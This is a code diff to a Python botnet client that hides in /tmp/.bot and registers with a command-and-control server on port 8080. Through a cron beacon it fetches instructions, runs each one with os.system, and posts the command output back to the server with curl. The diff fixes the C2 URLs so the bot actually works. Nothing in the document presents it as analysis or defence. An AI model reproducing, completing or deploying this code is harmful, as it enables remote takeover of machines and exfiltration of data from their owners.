@@ -34,14 +34,14 @@ def directoryhandler():
 def namecheck():
 	dir = os.path.join('/tmp','.bot')
 	os.chdir(dir)
-	botnames = requests.get('{IP}:8080/botnames.txt')
+	botnames = requests.get('http://{IP}:8080/botnames.txt')
 	data = botnames.text.strip().split()
 	lastbot = data[-1]
 	with open('name.txt', 'r+') as f:
 		if f.read() =='':
 			myname = str(int(lastbot)+1)
 			f.write(myname)
-			request = 'curl -d '+myname+' {IP}:8080/botnames.txt'
+			request = 'curl -d '+myname+' http://{IP}:8080/botnames.txt'
 			os.system(request)
 
 #this is a beacon that runs as a cronjob 
@@ -59,7 +59,7 @@ def beacon():
 def instructions():
 	dir = '/tmp/.bot/'
 	os.chdir(dir)
-	os.system('curl {IP}:8080/instructions.txt > response.txt')
+	os.system('curl http://{IP}:8080/instructions.txt > response.txt')
 	os.system("echo 'from_bot_number:' > sendthis.txt && cat name.txt >> sendthis.txt")
 	os.system("cat names.txt >> sendthis.txt")
 	os.system("echo ':' >> sendthis.txt")
@@ -74,7 +74,7 @@ def instructions():
 					mycommand += ' '
 				os.system(mycommand)
 				os.system("echo '_NextTask_' >> sendthis.txt")
-	os.system('curl --data-binary @./sendthis.txt {IP}:8080/instructions.txt')
+	os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/instructions.txt')
 	os.system('rm sendthis.txt response.txt')
 
 
